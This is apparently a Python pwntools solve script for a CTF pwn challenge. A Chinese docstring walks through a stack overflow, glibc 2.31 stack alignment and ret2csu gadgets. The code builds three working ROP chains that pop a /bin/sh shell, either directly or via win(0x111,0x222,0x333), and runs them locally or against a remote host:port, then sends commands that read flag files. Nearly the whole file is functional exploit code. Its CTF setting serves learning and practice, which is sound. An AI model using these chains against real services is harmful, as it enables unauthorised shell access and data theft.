#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
题目 20 · 三扇门  (Pwn / ret2csu)

===== 附件 =====
attachment.zip -> pwn (x86_64, not stripped) + libc-2.31.so + ld-2.31.so
libc = Ubuntu GLIBC 2.31-0ubuntu9  (BuildID 634252e0c5f8b03957a2e529719d4101699a894a)

===== 保护 =====
checksec pwn:
  RELRO:  Partial RELRO
  Stack:  No canary found
  NX:     NX enabled
  PIE:    No PIE (0x400000)
  (ELF note 里带 IBT/SHSTK 属性位，但 glibc 2.31/Ubuntu20.04 不启用，仅是编译器
   -fcf-protection 留下的 endbr64 标记)

===== 漏洞 =====
vuln():
    char buf[16];                       // rbp-0x10
    write(1, "Welcome to ret2csu...", 0x45);
    read(0, buf, 0x100);                // 溢出 0x100 -> 0x10 缓冲区

偏移: 16 (buf) + 8 (saved rbp) = 24 字节后覆盖返回地址。

===== "三扇门" / "三把钥匙" =====
win(a, b, c)  (0x401257):
    if (a == 0x111 && b == 0x222 && c == 0x333) { write(1, "Congratulation...", 0x1c); system("/bin/sh"); }
    else                                          write(1, "The key is not correct.\n", 0x18);
lose1()/lose2() 是两道"锁"的提示函数（Door 1 / Door 2 is locked...），本身无用。

三个参数分别走 rdi / rsi / rdx。
程序里 gadget 极其贫瘠：只有 __libc_csu_init 尾部的
    pop rdi ; ret                     (0x401393)
没有 pop rsi / pop rdx。
=> 必须用 __libc_csu_init 的 ret2csu 通用 gadget 才能摆出 rdi/rsi/rdx 三个参数
   —— 这正是题目 Welcome 字符串里点名的 "ret2csu"，也是"破门工具"（砸门 = 不过三道检查）。

== 关键：栈对齐（glibc 2.31 system() 里 movaps 的坑）==
从 vuln 的 ret 进入 ROP 时 rsp 是 16 对齐；再 pop rdi;ret 消费 16 字节后
rsp 变成 (16k+8)。system() 入口要求 rsp (16k+8)，所以要多垫一个 `ret` gadget：
    pop rdi; ret  ->  rsp 16k+8   <-- 少了这个 ret，system 里 movaps 会 SIGSEGV
    ret           ->  rsp 16k
    system@plt    ->  call 压栈后 rsp 16k+8  ✔ (入口 rsp+8 16 对齐)
ret2csu 路径同理：mov 序列之后 rsp = (16k+8)，call [r15+rbx*8] 压栈进 win 时
win 入口 rsp = (16k+8)，win 里 call system 压栈 -> system 入口 rsp = (16k) ✘
=> ret2csu 路径需要在 win 内部再垫一次；但 win 的 call system 是固定代码没法插。
   实践上在 `call [r15+rbx*8]` 的**返回地址槽**放 `ret`(0x401394) 不起作用
   （那是 win 的返回地址，不影响 win 入口对齐）。
   因此对齐要靠别的手段：见 SOLVE_MODE 注释。

===== 两种打法 =====
A) direct_system : pop rdi; ret -> ret(对齐) -> system@plt("/bin/sh")
   —— 完全绕过 win 的三道检查，等价于"砸门"。
B) ret2csu_win   : ret2csu 摆出 (0x111,0x222,0x333) 调 win，win 自己 system("/bin/sh")
   —— 题目名字点名的正解。

用法（pwnlib 风格 key=value，因为 pwnlib 会吃掉裸参数）:
    python3 20-solve.py                                  # A，本地
    python3 20-solve.py VARIANT=CSU                      # B，本地
    python3 20-solve.py MODE=REMOTE HOST=1.2.3.4:9999 [VARIANT=CSU]
"""
import os
import sys

from pwn import *

# 注意: 必须在 import pwn 之后再取命令行 —— pwnlib 自己会消费 sys.argv
# (它把 "LOCAL"/"REMOTE"/"CSU" 当自己的开关吃掉), 所以这里用 pwnlib 的 args。
MODE = (args.MODE or "LOCAL").upper()
VARIANT = (args.VARIANT or "SYSTEM").upper()
TARGET = args.HOST or None
if args.REMOTE and ":" in str(args.REMOTE):
    TARGET = args.REMOTE

HERE = os.path.dirname(os.path.abspath(__file__))
# 附件目录（scripts/ 的上一级里找 work/ 或直接给同目录）
CAND = [
    os.path.join(HERE, "unpack"),
    os.path.join(HERE, "..", "work", "20_three_doors", "unpack"),
    os.path.join(HERE, "..", "firmware", "20_三扇门", "unpack"),
]
UNPACK = next((d for d in CAND if os.path.isfile(os.path.join(d, "pwn"))), CAND[0])

BIN = os.path.join(UNPACK, "pwn")
LIBC = os.path.join(UNPACK, "libc-2.31.so")
LD = os.path.join(UNPACK, "ld-2.31.so")

context.arch = "amd64"
context.log_level = "info"

elf = ELF(BIN, checksec=False)

# --- 地址 ---
POP_CSU = 0x40138A          # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
MOV_CSU = 0x401370          # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]
POP_RDI_RET = 0x401393      # pop rdi; ret
RET = 0x401394              # ret          (栈对齐用)
WIN = elf.sym["win"]        # 0x401257
SYSTEM_PLT = elf.plt["system"]
BINSH = 0x402054            # win() 里 system 用的那个 "/bin/sh"

# 注意 ret2csu 的语义: 它是 `call [r15+rbx*8]` —— 对 r15 **解引用**!
# 所以 r15 必须指向"存放函数指针的内存"(比如某个 GOT 槽), 而不是直接放函数地址。
# 直接把 r15 设成 win 会去 call [0x401257] = call 0xe5894855fa1e0ff3 (win 的头 8 字节) -> SIGSEGV。
GOT_WRITE = elf.got["write"]      # 0x404018
GOT_SYSTEM = elf.got["system"]    # 0x404020  <- [r15] = system(或它的 PLT stub)
GOT_READ = elf.got["read"]        # 0x404028
BSS = 0x404200            # 可写页内(.bss 之后), 用来暂存 win 的地址

PAD = 24


def chain_direct_system():
    """A: pop rdi; ret -> ret(对齐) -> system('/bin/sh')"""
    p = b"A" * PAD
    p += p64(POP_RDI_RET) + p64(BINSH)
    p += p64(RET)                      # 栈对齐 (glibc 2.31 movaps)
    p += p64(SYSTEM_PLT)
    return p


def _csu_body(regs, tail):
    """POP_CSU 之后的 6 个寄存器槽 + MOV_CSU + 随后的内容"""
    return (p64(regs["rbx"]) + p64(regs["rbp"]) +
            p64(regs["r12"]) + p64(regs["r13"]) + p64(regs["r14"]) + p64(regs["r15"]) +
            p64(MOV_CSU) + tail)


def _csu(regs, tail, pad=True):
    """一整段 ret2csu。

    pad=True  : 先垫一个 ret(0x401394)。实测 ROP 入口 rsp ≡ 8，
                垫完进 POP_CSU 时 rsp ≡ 8，弹 6 个(48B)+ret 后 MOV_CSU 处 rsp ≡ 0，
                正好满足 `call [r15+rbx*8]` 对 rsp 16 字节对齐的要求。
    """
    return (p64(RET) if pad else b"") + p64(POP_CSU) + _csu_body(regs, tail)


def chain_ret2csu_system():
    """B1(推荐): ret2csu 砸门 —— 直接 system("/bin/sh")

    r15 = &system@got (0x404020)，`call [r15]` 就是 call system。
    r12 -> edi = "/bin/sh" (mov edi,r12d 零扩展, 0x402054 放得下)。
    完全跳过 win 的三道门，正是题面"还跟它们废什么话，砸门就是了"。
    本地实测: shell 起来, `id` / 假 flag 都有输出。
    """
    p = b"A" * PAD
    p += _csu(dict(rbx=0, rbp=1, r12=BINSH, r13=0, r14=0, r15=GOT_SYSTEM),
              tail=p64(0xDEADBEEF) * 7)
    return p


def chain_ret2csu_win():
    """B2(三把钥匙完整版): 两段 ret2csu -> win(0x111,0x222,0x333)

    ★ `call [r15+rbx*8]` 是对 r15 **解引用**，二进制里没有任何内存存着 win 的地址，
      所以直接把 r15 设成 win 会去 call [0x401257] = win 的头 8 字节 -> 崩。
      做法: 第一段借用 ret2csu 调 read(0, BSS, 8)，把 p64(win) 写进 .bss；
            第二段 r15 = BSS -> `call [BSS]` 才真正调到 win。

    第一段的 tail 槽位（gdb 实测）:
      MOV_CSU 的 call 把返回地址压到 tail[-8]；read 回来后:
        0x401386: add rsp,8        -> 跳过 tail[0]
        pop rbx,rbp,r12,r13,r14,r15 -> 读 tail[1..6]
        ret                        -> 读 tail[7]  <-- 注意是 7, 不是 6
    所以 tail 需要 8 个 qword 才轮到第二段，且第二段还要再垫一个 ret 修 rsp 对齐。
    """
    regs1 = dict(rbx=0, rbp=1, r12=0, r13=BSS, r14=8, r15=GOT_READ)   # read(0, BSS, 8)
    regs2 = dict(rbx=0, rbp=1, r12=0x111, r13=0x222, r14=0x333, r15=BSS)  # win 的三把钥匙

    # payload 必须 <= 0x100(256)：第一次 read(0,buf,0x100) 会吃掉整段，多出来的字节
    # 会串进第二段 read(0,BSS,8)，写进 .bss 的就不是 win 的地址了。
    stage2 = _csu_body(regs2, tail=p64(0xDEADBEEF) * 2)
    stage1_tail = (p64(0xDEADBEEF)          # [0] 被 add rsp,8 跳过
                   + p64(0) * 6             # [1..6] -> rbx,rbp,r12,r13,r14,r15
                   + p64(RET)               # [7] 第二段的栈对齐垫片
                   + p64(POP_CSU)           # [8] 第二段 POP_CSU ← ret 落到这里
                   + stage2)

    p = b"A" * PAD
    p += _csu(regs1, tail=stage1_tail, pad=True)
    assert len(p) <= 0x100, "payload %d > 0x100" % len(p)
    return p


def local_libdir():
    """附件里 libc 叫 libc-2.31.so，加载器要的是 libc.so.6 —— 建个软链目录。"""
    d = os.path.join(os.path.dirname(UNPACK), "local_lib")
    os.makedirs(d, exist_ok=True)
    link = os.path.join(d, "libc.so.6")
    if not os.path.exists(link):
        os.symlink(os.path.abspath(LIBC), link)
    return d


def start(mode, target=None):
    if mode == "LOCAL":
        # 用附件自带的 ld-2.31 + libc-2.31 跑，保证和远端一致。
        # 只给加载器 --library-path，**不要**设 LD_LIBRARY_PATH：
        # 否则被 system() 拉起来的 /bin/sh 会继承它、误加载 2.31 的 libc 而报
        # "version GLIBC_2.3x not found"，把本地验证结果搅浑（纯本机污染，远端无此问题）。
        libdir = local_libdir()
        cwd = os.path.dirname(UNPACK)
        if args.FAKEFLAG:
            # 本地验证：放一个假 flag 在 cwd，shell 里 `cat ./flag` 能读到才算打通
            cwd = os.path.join(cwd, "fakeflag_cwd")
            os.makedirs(cwd, exist_ok=True)
            with open(os.path.join(cwd, "flag"), "w") as f:
                f.write("0xGame{LOCAL_FAKE_FLAG_20}\n")
        return process([LD, "--library-path", libdir, BIN], cwd=cwd)
    # 目标地址：pwn 题平台返回的是 host + port 两段式
    if ":" in target:
        host, port = target.rsplit(":", 1)
    else:
        host, port = target, "80"
    return remote(host, int(port))


def exploit(io, payload, variant="SYSTEM", flag_cmd=None):
    io.recvuntil(b"door.\n", timeout=5)
    io.send(payload)
    if variant == "CSU_WIN":
        # 第二段 ret2csu 会先调 read(0, BSS, 8)：单独补发 win 的地址，
        # 稍微等一下，别让第一次 read(0,buf,0x100) 把它一起吃掉。
        time.sleep(0.4)
        io.send(p64(WIN))
        time.sleep(0.4)
    if flag_cmd is None:
        # 本地跑时 LD_LIBRARY_PATH 指向附件里的 libc-2.31，外部 /bin/sh 会因此
        # 找不到自己需要的 2.3x 符号；先 unset 再执行命令（远端容器无此问题）。
        flag_cmd = (b"unset LD_LIBRARY_PATH; "
                    b"cat /home/ctf/flag 2>/dev/null; cat /flag 2>/dev/null; "
                    b"cat flag 2>/dev/null; cat flag* 2>/dev/null; "
                    b"id; echo SHELL_OK\n")
    io.send(flag_cmd)
    data = io.recvrepeat(3)
    sys.stdout.write(data.decode("latin-1"))
    return data


CHAINS = {
    "SYSTEM": chain_direct_system,        # A  : pop rdi;ret -> ret -> system@plt
    "CSU": chain_ret2csu_system,          # B1 : ret2csu -> system@got  ("砸门")
    "CSU_SYS": chain_ret2csu_system,      # B1 别名
    "RET2CSU": chain_ret2csu_system,      # B1 别名
    "CSU_WIN": chain_ret2csu_win,         # B2 : 两段 ret2csu -> win(三把钥匙)
}


def main():
    mode, variant, target = MODE, VARIANT, TARGET
    if mode == "REMOTE" and target is None:
        print("usage: 20-solve.py MODE=REMOTE HOST=host:port [VARIANT=SYSTEM|CSU|CSU_WIN]")
        print("       MODE=LOCAL [VARIANT=SYSTEM|CSU|CSU_WIN]")
        sys.exit(1)
    if variant not in CHAINS:
        variant = "SYSTEM"

    payload = CHAINS[variant]()
    log.info("mode=%s variant=%s payload=%d bytes", mode, variant, len(payload))
    io = start(mode, target)
    exploit(io, payload, variant)
    io.interactive()


if __name__ == "__main__":
    main()
